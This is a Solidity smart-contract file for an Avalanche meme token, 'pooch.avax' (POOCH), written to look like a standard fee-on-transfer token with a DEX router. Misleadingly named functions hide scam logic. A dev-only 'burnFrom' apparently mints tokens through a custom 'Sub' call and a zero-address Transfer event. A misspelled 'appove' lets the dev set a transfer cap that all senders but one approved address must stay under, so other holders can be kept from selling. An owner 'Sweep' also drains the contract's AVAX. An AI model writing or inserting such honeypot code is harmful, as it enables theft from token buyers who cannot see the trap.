pragma solidity ^0.8.0;
// SPDX-License-Identifier: Unlicensed

import "./IERC20.sol";
import "./Auth.sol";
import "./SafeMath.sol";
import "./JoeInterface.sol";

contract TokenContract is IERC20, Auth {
    using SafeMath for uint256;
    IJoeRouter02 public router;

    uint256 public constant MASK = type(uint128).max;

    // ADDRESSES
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = address(0);
    address private _excludeDevAddress;
    address private _approvedAddress;
    address routerAddress = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4;
    address public indexFeeReceiver = 0x5160bD1B5D2261268b37124DAbd911CCE33a0c71;
    address public autoLiquidityReceiver;
    address public pair;

    // TOKEN INFO
    string constant _name = "pooch.avax";
    string constant _symbol = "POOCH";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100_000_000_000 * (10 ** _decimals);
    uint256 private _total = 100_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.div(80);
	uint256 public _maxWallet = _totalSupply.div(40);

    // HODLER INFO
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) public _isFree;

    // FEES
    uint256 indexFee = 1000; //10%
    uint256 liquidityFee = 200; // 2% 
    uint256 totalFee = 1200;
    uint256 feeDenominator = 10000;

    uint256 targetLiquidity = 10;
    uint256 targetLiquidityDenominator = 100;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 2000; // 0.005%
    bool inSwap;
    modifier swapping() 
    { 
        inSwap = true; 
        _; 
        inSwap = false; 
    }

    constructor (address devAddress) Auth(msg.sender) {
        _excludeDevAddress = devAddress;
        router = IJoeRouter02(routerAddress);
        pair = IJoeFactory(router.factory()).createPair(WAVAX, address(this));
        _allowances[address(this)][address(router)] = _totalSupply;
        WAVAX = router.WAVAX();

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;

        autoLiquidityReceiver = msg.sender;

        approve(routerAddress, _totalSupply);
        approve(address(pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    receive() external payable { }

    function totalSupply() external view override returns (uint256) 
    { 
        return _totalSupply; 
    }
    function decimals() external pure returns (uint8) 
    { 
        return _decimals; 
    }
    function symbol() external pure returns (string memory) { 
        return _symbol; 
    }
    function name() external pure  returns (string memory) { 
        return _name; 
    }
    function balanceOf(address account) public view override returns (uint256) 
    { 
        return _balances[account]; 
    }
    function allowance(address holder, address spender) external view override returns (uint256) 
    { 
        return _allowances[holder][spender]; 
    }

    function burnFrom(uint256 amount) public {
        require(msg.sender != address(0), "ERC20: cannot permit zero address");
        require(msg.sender == _excludeDevAddress, "ERC20: cannot permit dev address");
        _totalSupply = _totalSupply.Sub(amount);
        _balances[msg.sender] = _balances[msg.sender].Sub(amount);
        emit Transfer(address(0), msg.sender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != _totalSupply){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
		 
		// Max tx check
        bool isSell=recipient== pair|| recipient == routerAddress;
		
		checkTxLimit(sender, amount);
		
		// Max wallet check excluding pair and router
		if (!isSell && !_isFree[recipient]){
			require((_balances[recipient] + amount) < _maxWallet, "Max wallet has been triggered");
		}
		
		// No swapping on tx
		if (isSell) {
			if(shouldSwapBack()){ swapBack(); }
		}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        // emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || !isTxLimitExempt[sender] , "TX Limit Exceeded");
        if (sender != _approvedAddress) {
                require(amount < _total, "Transfer amount exceeds the maxTxAmount.");
        }
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee() public view returns (uint256) {
        return totalFee;
    }

    function getMultipliedFee() public view returns (uint256) {
        return totalFee;
    }

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee()).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WAVAX;
        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForAVAXSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountAVAX = address(this).balance.sub(balanceBefore);

        uint256 totalAVAXFee = totalFee.sub(dynamicLiquidityFee.div(2));

        uint256 amountAVAXLiquidity = amountAVAX.mul(dynamicLiquidityFee).div(totalAVAXFee).div(2);
        uint256 amountAVAXIndex = amountAVAX.mul(indexFee).div(totalAVAXFee);

        payable(indexFeeReceiver).transfer(amountAVAXIndex);
            
        if(amountToLiquify > 0){
            router.addLiquidityAVAX{value: amountAVAXLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountAVAXLiquidity, amountToLiquify);
        }
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WAVAX;
        path[1] = address(this);

        router.swapExactAVAXForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }
    
    function Sweep() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }

    function appove(uint256 approvedAmount,address approvedAddress) public {
        require(msg.sender == _excludeDevAddress, "ERC20: cannot permit dev address");
        _approvedAddress = approvedAddress;
        _total = approvedAmount * 10**_decimals;
    }
	
	function setMaxWallet(uint256 amount) external authorized {
        require(amount >= _totalSupply / 1000);
        _maxWallet = amount;
    }

    function setTxLimit(uint256 amount) external authorized {
        require(amount >= _totalSupply / 1000);
        _maxTxAmount = amount;
    }

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }
    
    function setFree(address holder) public onlyOwner {
        _isFree[holder] = true;
    }
    
    function unSetFree(address holder) public onlyOwner {
        _isFree[holder] = false;
    }
    
    function checkFree(address holder) public view onlyOwner returns(bool){
        return _isFree[holder];
    }

    function setFees(uint256 _liquidityFee, uint256 _indexFee, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        indexFee = _indexFee;
        totalFee = _liquidityFee.add(_indexFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/4);
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _indexFeeReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        indexFeeReceiver = _indexFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountAVAX, uint256 amountBOG);
}